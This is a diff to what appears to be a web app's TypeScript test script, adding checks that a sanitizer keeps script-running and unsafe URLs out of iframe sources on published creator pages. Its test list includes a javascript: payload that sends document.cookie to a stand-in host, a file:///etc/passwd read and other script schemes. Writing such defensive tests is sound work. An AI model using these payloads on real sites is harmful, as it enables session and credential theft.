@@ -28,7 +28,7 @@ import { join } from "node:path"
 
 import { fakeDb } from "./_fake-db"
 import { stripComments } from "./_source"
-import { EMBED_HOSTS, appleMusicEmbedUrl, embedSource } from "@/lib/onepage/embed-source"
+import { EMBED_HOSTS, appleMusicEmbedUrl, embedSource, safeFrameSrc } from "@/lib/onepage/embed-source"
 import { actOnContent, actOnMember, escalateReport, openReportCount, updateReport } from "@/lib/communities/server/moderation"
 import { MUTED_ACTIONS } from "@/lib/communities/server/context"
 import { checkReport } from "@/lib/communities/server/reports"
@@ -269,6 +269,32 @@ async function main() {
   check("the path and the query are kept, so a song inside an album is still that song", appleMusicEmbedUrl("https://music.apple.com/us/album/a/1?i=2") === "https://embed.music.apple.com/us/album/a/1?i=2")
   check("the player's address is Apple's own host", appleMusicEmbedUrl("https://music.apple.com/us/album/a/1")?.startsWith("https://embed.music.apple.com/") === true)
   check("junk is refused without throwing", [null, undefined, "", "   ", 7, {}, "not a url", "//music.apple.com/x"].every((u) => embedSource(u, EMBED_HOSTS.appleMusic) === null))
+
+  /* ── What may become an iframe src on a published page ───────────────── */
+  console.log("\nthe frames a creator's blocks draw")
+  /*
+    A block's fields are stored as the editor sent them (app/api/onepage PUT
+    keeps draft_blocks whole), and four of them became an <iframe src> with
+    no sandbox on the public page. An iframe whose src is javascript: runs in
+    the EMBEDDING page's origin, which on storelib.com is the origin the
+    signed in app uses.
+  */
+  const runs = ["javascript:fetch('https://e.example/'+document.cookie)", "JaVaScRiPt:alert(1)", "data:text/html,<script>alert(1)</script>", "blob:https://storelib.com/abc", "vbscript:msgbox(1)", "file:///etc/passwd"]
+  check("no scheme that runs can reach a frame", runs.every((u) => safeFrameSrc(u) === null), runs.filter((u) => safeFrameSrc(u) !== null).join(", "))
+  check("the control case is a scheme a browser would run", runs[0].startsWith("javascript:"))
+  check("a real booking page and a real file still do", safeFrameSrc("https://calendly.com/someone/30min") === "https://calendly.com/someone/30min" && safeFrameSrc("https://x.supabase.co/storage/v1/object/public/a/b.pdf")?.endsWith("b.pdf") === true)
+  check("this site's own path does, and a protocol relative address does not", safeFrameSrc("/files/a.pdf") === "/files/a.pdf" && safeFrameSrc("//evil.example.com/x") === null)
+  check("plain http does not, on a page served over https", safeFrameSrc("http://calendly.com/someone/30min") === null)
+  check("nor does a host hidden behind credentials", safeFrameSrc("https://calendly.com@evil.example.com/x") === null)
+  const stored = embedSource("https://www.tiktok.com/embed/v2/7234567890123456789", EMBED_HOSTS.tiktok)
+  check("a TikTok frame is pinned to TikTok's host", stored?.hostname === "tiktok.com" && embedSource("https://evil.example.com/embed/v2/1", EMBED_HOSTS.tiktok) === null)
+  check("the published page sends all four through a check", (() => {
+    const src = code("components/onepage/public-onepage.tsx")
+    return /const calendlyUrl = safeFrameSrc\(/.test(src) && /const pdfUrl = safeFrameSrc\(/.test(src) && /embedSource\(data\.tiktok_embed_url, EMBED_HOSTS\.tiktok\)/.test(src) && /appleMusicEmbedUrl\(url\)/.test(src)
+  })())
+  const csp = code("lib/security/csp.ts")
+  const vercel = readFileSync("vercel.json", "utf8")
+  check("and the frame policy knows about the two players it draws", /https:\/\/embed\.music\.apple\.com/.test(csp) && /https:\/\/www\.tiktok\.com/.test(csp) && /frame-src[^;"]*https:\/\/embed\.music\.apple\.com/.test(vercel) && /frame-src[^;"]*https:\/\/www\.tiktok\.com/.test(vercel))
 
   /* ── The routes that ask somebody else's site ────────────────────────── */
   console.log("\nthe routes that ask somebody else's site")
